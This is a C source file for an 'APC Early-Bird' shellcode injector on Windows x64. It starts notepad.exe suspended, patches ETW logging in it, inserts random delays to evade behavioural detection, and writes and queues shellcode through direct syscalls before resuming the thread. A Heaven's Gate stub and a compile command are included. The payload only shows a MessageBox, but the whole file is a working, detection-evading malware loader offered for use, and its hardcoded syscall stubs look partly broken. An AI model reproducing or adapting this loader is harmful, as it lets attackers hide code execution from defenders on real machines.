#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <psapi.h>
#include <time.h>

// ============ X64 SHELLCODE (MessageBox) ============
unsigned char shellcode[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
    "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
    "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
    "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
    "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
    "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
    "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
    "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
    "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
    "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
    "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
    "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
    "\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
    "\x85\x11\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
    "\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x48\x65\x6c"
    "\x6c\x6f\x20\x66\x72\x6f\x6d\x20\x53\x74\x65\x61\x6c\x74\x68"
    "\x20\x45\x61\x72\x6c\x79\x2d\x42\x69\x72\x64\x21\x00\x48\x65"
    "\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x00";

// ============ NATIVE API TYPEDEFS ============
typedef NTSTATUS(NTAPI *pNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId);

typedef NTSTATUS(NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);

typedef NTSTATUS(NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten);

typedef NTSTATUS(NTAPI *pNtQueueApcThreadEx)(
    HANDLE ThreadHandle,
    HANDLE ApcReserveHandle,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcRoutineContext,
    PIO_STATUS_BLOCK ApcStatusBlock,
    ULONG ApcReserved);

typedef NTSTATUS(NTAPI *pNtResumeThread)(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount);

typedef NTSTATUS(NTAPI *pNtDelayExecution)(
    BOOLEAN Alertable,
    PLARGE_INTEGER DelayInterval);

// ============ SYSCALL STUB (Direct Syscall) ============
__attribute__((naked))
VOID
SyscallStub()
{
    __asm__ volatile(
        "mov r10, rcx\n\t"
        "mov eax, edx\n\t"
        "syscall\n\t"
        "ret\n\t");
}

// ============ SYSCALL WRAPPERS ============
NTSTATUS NtAllocateVirtualMemory_Syscall(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
// Windows 10 22H2 x64 syscall numbers
#define SYSCALL_NT_ALLOCATE_VIRTUAL_MEMORY 0x18

    NTSTATUS status;
    __asm__ volatile(
        "mov r10, %1\n\t"
        "mov eax, %2\n\t"
        "syscall\n\t"
        "mov %0, eax"
        : "=r"(status)
        : "r"(ProcessHandle), "i"(SYSCALL_NT_ALLOCATE_VIRTUAL_MEMORY)
        : "r10", "memory");
    return status;
}

NTSTATUS NtWriteVirtualMemory_Syscall(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten)
{
#define SYSCALL_NT_WRITE_VIRTUAL_MEMORY 0x3A

    NTSTATUS status;
    __asm__ volatile(
        "mov r10, %1\n\t"
        "mov eax, %2\n\t"
        "syscall\n\t"
        "mov %0, eax"
        : "=r"(status)
        : "r"(ProcessHandle), "i"(SYSCALL_NT_WRITE_VIRTUAL_MEMORY)
        : "r10", "memory");
    return status;
}

NTSTATUS NtQueueApcThreadEx_Syscall(
    HANDLE ThreadHandle,
    HANDLE ApcReserveHandle,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcRoutineContext,
    PIO_STATUS_BLOCK ApcStatusBlock,
    ULONG ApcReserved)
{
#define SYSCALL_NT_QUEUE_APC_THREAD_EX 0xBD

    NTSTATUS status;
    __asm__ volatile(
        "mov r10, %1\n\t"
        "mov eax, %2\n\t"
        "syscall\n\t"
        "mov %0, eax"
        : "=r"(status)
        : "r"(ThreadHandle), "i"(SYSCALL_NT_QUEUE_APC_THREAD_EX)
        : "r10", "memory");
    return status;
}

NTSTATUS NtResumeThread_Syscall(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount)
{
#define SYSCALL_NT_RESUME_THREAD 0x52

    NTSTATUS status;
    __asm__ volatile(
        "mov r10, %1\n\t"
        "mov eax, %2\n\t"
        "syscall\n\t"
        "mov %0, eax"
        : "=r"(status)
        : "r"(ThreadHandle), "i"(SYSCALL_NT_RESUME_THREAD)
        : "r10", "memory");
    return status;
}

NTSTATUS NtDelayExecution_Syscall(
    BOOLEAN Alertable,
    PLARGE_INTEGER DelayInterval)
{
#define SYSCALL_NT_DELAY_EXECUTION 0x4B

    NTSTATUS status;
    __asm__ volatile(
        "mov r10, %1\n\t"
        "mov eax, %2\n\t"
        "syscall\n\t"
        "mov %0, eax"
        : "=r"(status)
        : "r"(Alertable), "i"(SYSCALL_NT_DELAY_EXECUTION)
        : "r10", "memory");
    return status;
}

// ============ ETW PATCHING ============
BOOL PatchEtwInTargetProcess(HANDLE hProcess)
{
    BYTE patch = 0xC3; // RET
    HMODULE hNtdllRemote = NULL;
    HMODULE hMods[1024];
    DWORD cbNeeded;

    printf("[*] Locating ntdll.dll in target process...\n");

    // Get ntdll base address in target process
    if (EnumProcessModulesEx(hProcess, hMods, sizeof(hMods), &cbNeeded, LIST_MODULES_ALL))
    {
        for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            char szModName[MAX_PATH];
            if (GetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName)))
            {
                if (strstr(szModName, "ntdll.dll"))
                {
                    hNtdllRemote = hMods[i];
                    printf("[+] ntdll.dll in target at: %p\n", hNtdllRemote);
                    break;
                }
            }
        }
    }

    if (!hNtdllRemote)
    {
        printf("[-] Could not find ntdll in target\n");
        return FALSE;
    }

    // Get local EtwEventWrite address
    HMODULE hLocalNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pLocalEtw = GetProcAddress(hLocalNtdll, "EtwEventWrite");

    if (!pLocalEtw)
    {
        printf("[-] Could not find EtwEventWrite locally\n");
        return FALSE;
    }

    // Calculate offset and apply to target
    ULONG64 offset = (ULONG64)pLocalEtw - (ULONG64)hLocalNtdll;
    LPVOID remoteEtwAddress = (LPVOID)((ULONG64)hNtdllRemote + offset);

    printf("[*] EtwEventWrite in target at: %p\n", remoteEtwAddress);
    printf("[*] Patching with RET (0xC3)...\n");

    // Use syscall for VirtualProtectEx equivalent
    // For simplicity, we'll use WinAPI here (can be replaced with syscalls)
    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteEtwAddress, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    WriteProcessMemory(hProcess, remoteEtwAddress, &patch, 1, NULL);
    VirtualProtectEx(hProcess, remoteEtwAddress, 1, oldProtect, &oldProtect);

    printf("[+] ETW patched successfully in target process!\n");
    return TRUE;
}

// ============ HEAVEN'S GATE (WOW64) ============
#ifdef _WIN32
// This code is for 32-bit compiling to demonstrate Heaven's Gate
// But our main technique is x64 - this is a reference implementation
__declspec(naked) VOID HeavensGateSyscall()
{
    __asm {
        // Switch to 64-bit mode
        push 0x33
        call far ptr switch64
    switch64:
        jmp fword ptr [esp]
        retf

                // 64-bit mode
        _emit 0x49 // mov r10, rcx
        _emit 0x89
        _emit 0xca
        _emit 0xb8 // mov eax, SYSCALL_NUMBER
        _emit 0x18
        _emit 0x00
        _emit 0x00
        _emit 0x00
        _emit 0x0f // syscall
        _emit 0x05
        _emit 0xc3 // ret

        // Switch back to 32-bit
        push 0x23
        retf
    }
}
#endif

// ============ RANDOM DELAY ============
VOID RandomDelay()
{
    // Seed random
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());

    // Random delay between 500-1500ms
    int delayMs = 500 + (rand() % 1000);

    printf("[*] Random delay: %d ms\n", delayMs);

    LARGE_INTEGER delay;
    delay.QuadPart = -10000 * delayMs; // Negative = relative time

    // Use syscall for delay
    NtDelayExecution_Syscall(FALSE, &delay);

    printf("[+] Delay complete\n");
}

// ============ GET NT DLL FUNCTIONS (FALLBACK) ============
BOOL GetNtFunctions(pNtQueueApcThreadEx *pNtQueueApcThreadEx)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll)
        return FALSE;

    *pNtQueueApcThreadEx = (pNtQueueApcThreadEx)GetProcAddress(hNtdll, "NtQueueApcThreadEx");

    return (*pNtQueueApcThreadEx != NULL);
}

// ============ MAIN EARLY-BIRD WITH FULL EVASION ============
int main()
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    PVOID remoteShellcode = NULL;
    SIZE_T shellcodeSize = sizeof(shellcode);
    NTSTATUS status;
    ULONG suspendCount = 0;

    printf("========================================\n");
    printf("  APC Early-Bird with Full Evasion\n");
    printf("  (x64 Windows 10 - Syscall + ETW + Delay)\n");
    printf("========================================\n\n");

    printf("[*] Local process ID: %d\n", GetCurrentProcessId());
    printf("[*] Shellcode size: %zu bytes\n", shellcodeSize);

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(STARTUPINFO);

    // ============ STEP 1: CREATE SUSPENDED PROCESS ============
    printf("\n[1] Creating suspended process...\n");

    if (!CreateProcessA(
            "C:\\Windows\\System32\\notepad.exe",
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED, // CRITICAL!
            NULL,
            NULL,
            &si,
            &pi))
    {
        printf("[-] CreateProcess failed: %d\n", GetLastError());
        return -1;
    }

    printf("[+] Process created. PID: %d\n", pi.dwProcessId);
    printf("[+] Thread suspended. Handle: %p\n", pi.hThread);

    // ============ STEP 2: PATCH ETW IN TARGET (BEFORE ALLOCATION) ============
    printf("\n[2] Patching ETW in target process...\n");
    PatchEtwInTargetProcess(pi.hProcess);

    // ============ STEP 3: RANDOM DELAY (Evade behavioral detection) ============
    printf("\n[3] Introducing random delay...\n");
    RandomDelay();

    // ============ STEP 4: ALLOCATE MEMORY VIA SYSCALL ============
    printf("\n[4] Allocating memory in target via direct syscall...\n");

    remoteShellcode = NULL;
    status = NtAllocateVirtualMemory_Syscall(
        pi.hProcess,
        &remoteShellcode,
        0,
        &shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (status != 0 || !remoteShellcode)
    {
        printf("[-] NtAllocateVirtualMemory failed: 0x%08lx\n", status);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    printf("[+] Memory allocated at: 0x%p (in target)\n", remoteShellcode);

    // ============ STEP 5: WRITE SHELLCODE VIA SYSCALL ============
    printf("\n[5] Writing shellcode via direct syscall...\n");

    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory_Syscall(
        pi.hProcess,
        remoteShellcode,
        shellcode,
        shellcodeSize,
        &bytesWritten);

    if (status != 0 || bytesWritten != shellcodeSize)
    {
        printf("[-] NtWriteVirtualMemory failed: 0x%08lx\n", status);
        VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    printf("[+] Shellcode written: %zu bytes\n", bytesWritten);

    // ============ STEP 6: QUEUE APC VIA NATIVE API / SYSCALL ============
    printf("\n[6] Queueing APC to suspended thread...\n");

    // Try NtQueueApcThreadEx via direct syscall first
    status = NtQueueApcThreadEx_Syscall(
        pi.hThread,
        NULL,
        (PIO_APC_ROUTINE)remoteShellcode,
        NULL,
        NULL,
        0);

    if (status == 0)
    {
        printf("[+] APC queued via NtQueueApcThreadEx (syscall)!\n");
    }
    else
    {
        // Fallback to NtQueueApcThreadEx from ntdll
        pNtQueueApcThreadEx NtQueueApcThreadEx = NULL;

        if (GetNtFunctions(&NtQueueApcThreadEx))
        {
            printf("[*] Syscall failed, trying NtQueueApcThreadEx from ntdll...\n");

            status = NtQueueApcThreadEx(
                pi.hThread,
                NULL,
                (PIO_APC_ROUTINE)remoteShellcode,
                NULL,
                NULL,
                0);

            if (status == 0)
                printf("[+] APC queued via NtQueueApcThreadEx (ntdll)!\n");
        }

        if (status != 0)
        {
            // Final fallback to QueueUserAPC
            printf("[*] Native API failed, falling back to QueueUserAPC...\n");

            if (!QueueUserAPC((PAPCFUNC)remoteShellcode, pi.hThread, 0))
            {
                printf("[-] All APC queue methods failed!\n");
                VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return -1;
            }

            printf("[+] APC queued via QueueUserAPC\n");
        }
    }

    // ============ STEP 7: ANOTHER RANDOM DELAY (Evade pattern detection) ============
    printf("\n[7] Second random delay before resume...\n");
    RandomDelay();

    // ============ STEP 8: RESUME THREAD VIA SYSCALL ============
    printf("\n[8] Resuming thread via direct syscall...\n");
    printf("[!] CRITICAL: APC will execute IMMEDIATELY on resume!\n");
    printf("[!] Shellcode runs BEFORE notepad.exe entry point!\n\n");

    status = NtResumeThread_Syscall(pi.hThread, &suspendCount);

    if (status != 0)
    {
        printf("[-] NtResumeThread failed: 0x%08lx\n", status);
        ResumeThread(pi.hThread); // Fallback
    }
    else
    {
        printf("[+] Thread resumed via syscall. Previous suspend count: %lu\n", suspendCount);
    }

    printf("[+] APC executing NOW in target process!\n");
    printf("[+] Check for MessageBox from notepad.exe\n");

    // ============ STEP 9: WAIT FOR PROCESS ============
    printf("\n[9] Waiting for process to exit...\n");
    WaitForSingleObject(pi.hProcess, INFINITE);

    // ============ STEP 10: CLEANUP ============
    printf("\n[10] Cleaning up...\n");
    VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("[+] Process terminated. Demo complete.\n");
    system("pause");

    return 0;
}

// x86_64-w64-mingw32-gcc -o apc_early_bird_stealth.exe apc_early_bird_stealth.c -lpsapi -masm=intel